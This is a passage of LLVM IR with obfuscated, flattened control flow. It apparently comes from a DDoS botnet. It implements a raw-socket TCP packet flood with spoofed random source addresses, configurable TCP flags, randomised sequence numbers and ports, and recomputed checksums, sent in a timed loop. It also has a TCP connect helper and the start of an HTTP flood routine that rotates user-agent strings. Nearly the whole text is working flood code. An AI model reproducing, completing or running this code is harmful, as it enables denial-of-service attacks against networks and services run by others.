  %38 = call zeroext i16 @htons(i16 zeroext %37) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 2070906970, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 2038317597, i32 -163071
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -511586619, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -1094302030, i32 1723350603
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -511586619, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #5
  %59 = icmp slt i32 %58, 0
  %60 = select i1 %59, i32 446682309, i32 -381992359
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -511586619, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %14, align 4
  %64 = icmp eq i32 %63, 0
  %65 = select i1 %64, i32 -1760892461, i32 1663861373
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 -642312008, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %14, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  store i32 -642312008, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %12, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  store i64 %76, i64* %.reg2mem2
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %78 = alloca i8, i64 %.reload4, align 16
  store i8* %78, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %79 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #10
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon* %103 to %struct.anon.0*
  %105 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon* %107 to %struct.anon.0*
  %109 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %11, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.296, i32 0, i32 0)) #9
  %119 = icmp ne i32 %118, 0
  %120 = select i1 %119, i32 -1074168648, i32 -189720463
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon* %130 to %struct.anon.0*
  %132 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon* %137 to %struct.anon.0*
  %139 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon* %144 to %struct.anon.0*
  %146 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon* %151 to %struct.anon.0*
  %153 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  store i32 -221991199, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %11, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %159, i8** %23, align 8
  store i32 -667566079, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8*, i8** %23, align 8
  %162 = icmp ne i8* %161, null
  %163 = select i1 %162, i32 -610854255, i32 628617675
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.298, i32 0, i32 0)) #9
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 674258140, i32 726246475
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon* %171 to %struct.anon.0*
  %173 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -513
  %176 = or i16 %175, 512
  store i16 %176, i16* %173, align 4
  store i32 1030613165, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8*, i8** %23, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.299, i32 0, i32 0)) #9
  %180 = icmp ne i32 %179, 0
  %181 = select i1 %180, i32 1584351217, i32 -1156278336
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon* %184 to %struct.anon.0*
  %186 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  store i32 2011750399, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8*, i8** %23, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.300, i32 0, i32 0)) #9
  %193 = icmp ne i32 %192, 0
  %194 = select i1 %193, i32 -262236219, i32 793530004
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon* %197 to %struct.anon.0*
  %199 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -257
  %202 = or i16 %201, 256
  store i16 %202, i16* %199, align 4
  store i32 1562573953, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8*, i8** %23, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.301, i32 0, i32 0)) #9
  %206 = icmp ne i32 %205, 0
  %207 = select i1 %206, i32 95840867, i32 816544382
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon* %210 to %struct.anon.0*
  %212 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -4097
  %215 = or i16 %214, 4096
  store i16 %215, i16* %212, align 4
  store i32 -655551924, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %23, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.302, i32 0, i32 0)) #9
  %219 = icmp ne i32 %218, 0
  %220 = select i1 %219, i32 -747700527, i32 726190143
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon* %223 to %struct.anon.0*
  %225 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -2049
  %228 = or i16 %227, 2048
  store i16 %228, i16* %225, align 4
  store i32 1905122276, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 1905122276, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 -655551924, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 1562573953, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 2011750399, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 1030613165, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %235, i8** %23, align 8
  store i32 -667566079, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 -221991199, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon* %241 to %struct.anon.0*
  %243 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %242, i32 0, i32 5
  store i16 %239, i16* %243, align 2
  %244 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon* %245 to %struct.anon.0*
  %247 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 7
  store i16 0, i16* %251, align 2
  %252 = load i32, i32* %9, align 4
  %253 = icmp eq i32 %252, 0
  %254 = select i1 %253, i32 -361737560, i32 127935275
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = call i32 @rand_cmwc()
  store i32 1934837574, i32* %switchVar
  store i32 %256, i32* %.reg2mem10
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %9, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #10
  %261 = zext i16 %260 to i32
  store i32 1934837574, i32* %switchVar
  store i32 %261, i32* %.reg2mem10
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %263 = trunc i32 %.reload11 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon* %265 to %struct.anon.0*
  %267 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %266, i32 0, i32 1
  store i16 %263, i16* %267, align 2
  %268 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = call zeroext i16 @tcpcsum(%struct.iphdr* %268, %struct.tcphdr* %269)
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon* %272 to %struct.anon.0*
  %274 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %273, i32 0, i32 6
  store i16 %270, i16* %274, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %275 = bitcast i8* %.reload8 to i16*
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 2
  %278 = load i16, i16* %277, align 2
  %279 = zext i16 %278 to i32
  %280 = call zeroext i16 @csum(i16* %275, i32 %279)
  %281 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = call i64 @time(i64* null) #5
  %284 = load i32, i32* %10, align 4
  %285 = sext i32 %284 to i64
  %286 = add nsw i64 %283, %285
  %287 = trunc i64 %286 to i32
  store i32 %287, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -2010116253, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  store i32 -767385673, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %17, align 4
  %291 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %292 = call i64 @sendto(i32 %290, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %291, i32 16)
  %293 = load i32, i32* %19, align 4
  %294 = call i32 @getRandomIP(i32 %293)
  %295 = call i32 @htonl(i32 %294) #10
  %296 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 8
  store i32 %295, i32* %297, align 4
  %298 = call i32 @rand_cmwc()
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  %302 = call i32 @rand_cmwc()
  %303 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon* %304 to %struct.anon.0*
  %306 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %305, i32 0, i32 2
  store i32 %302, i32* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = trunc i32 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 0
  store i16 %308, i16* %312, align 4
  %313 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon* %314 to %struct.anon.0*
  %316 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %315, i32 0, i32 6
  store i16 0, i16* %316, align 4
  %317 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = call zeroext i16 @tcpcsum(%struct.iphdr* %317, %struct.tcphdr* %318)
  %320 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon* %321 to %struct.anon.0*
  %323 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %322, i32 0, i32 6
  store i16 %319, i16* %323, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %324 = bitcast i8* %.reload6 to i16*
  %325 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 2
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @csum(i16* %324, i32 %328)
  %330 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 7
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* %25, align 4
  %333 = load i32, i32* %15, align 4
  %334 = icmp eq i32 %332, %333
  %335 = select i1 %334, i32 -570209970, i32 -420117700
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = call i64 @time(i64* null) #5
  %338 = load i32, i32* %24, align 4
  %339 = sext i32 %338 to i64
  %340 = icmp sgt i64 %337, %339
  %341 = select i1 %340, i32 -1819386318, i32 -122882172
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 1867029092, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -2010116253, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i32, i32* %25, align 4
  %346 = add i32 %345, 1
  store i32 %346, i32* %25, align 4
  store i32 -2010116253, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %348)
  store i32 -511586619, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %347, %344, %343, %342, %336, %289, %288, %262, %257, %255, %237, %236, %234, %233, %232, %231, %230, %229, %221, %216, %208, %203, %195, %190, %182, %177, %169, %164, %160, %157, %121, %73, %67, %66, %62, %61, %55, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %.reg2mem = alloca %struct.hostent*
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %.reg2mem
  %.reload2 = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  store %struct.hostent* %.reload2, %struct.hostent** %6, align 8
  %switchVar = alloca i32
  store i32 -1000218987, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1000218987, label %first
    i32 -119304550, label %14
    i32 -1377600341, label %15
    i32 794231985, label %38
    i32 975937757, label %39
    i32 -366893468, label %45
    i32 25535099, label %46
    i32 -254235558, label %48
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct.hostent*, %struct.hostent** %.reg2mem
  %12 = icmp eq %struct.hostent* %.reload, null
  %13 = select i1 %12, i32 -119304550, i32 -1377600341
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -254235558, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load %struct.hostent*, %struct.hostent** %6, align 8
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %16, i32 0, i32 4
  %18 = load i8**, i8*** %17, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %22 = bitcast %struct.in_addr* %21 to i8*
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 3
  %25 = load i32, i32* %24, align 4
  %26 = sext i32 %25 to i64
  call void @bcopy(i8* %20, i8* %22, i64 %26) #5
  %27 = load i16, i16* %5, align 2
  %28 = call zeroext i16 @htons(i16 zeroext %27) #10
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = bitcast i32* %8 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 6, i32 1, i8* %33, i32 4) #5
  %35 = load i32, i32* %9, align 4
  %36 = icmp eq i32 %35, -1
  %37 = select i1 %36, i32 794231985, i32 975937757
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -254235558, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %9, align 4
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  %43 = icmp eq i32 %42, -1
  %44 = select i1 %43, i32 -366893468, i32 25535099
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -254235558, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %9, align 4
  store i32 %47, i32* %3, align 4
  store i32 -254235558, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %3, align 4
  ret i32 %49

loopEnd:                                          ; preds = %46, %45, %39, %38, %15, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 -169034690, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -169034690, label %24
    i32 546278547, label %29
    i32 -2127539364, label %43
    i32 1594617007, label %44
    i32 118438102, label %50
    i32 64683658, label %57
    i32 1111014578, label %68
    i32 -2054392433, label %69
    i32 -979313474, label %70
    i32 1443530950, label %71
    i32 -1293542601, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  %28 = select i1 %27, i32 546278547, i32 -1293542601
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %31 = load i8*, i8** %7, align 8
  %32 = load i8*, i8** %10, align 8
  %33 = load i8*, i8** %8, align 8
  %34 = call i32 @rand() #5
  %35 = srem i32 %34, 36
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %36
  %38 = load i8*, i8** %37, align 8
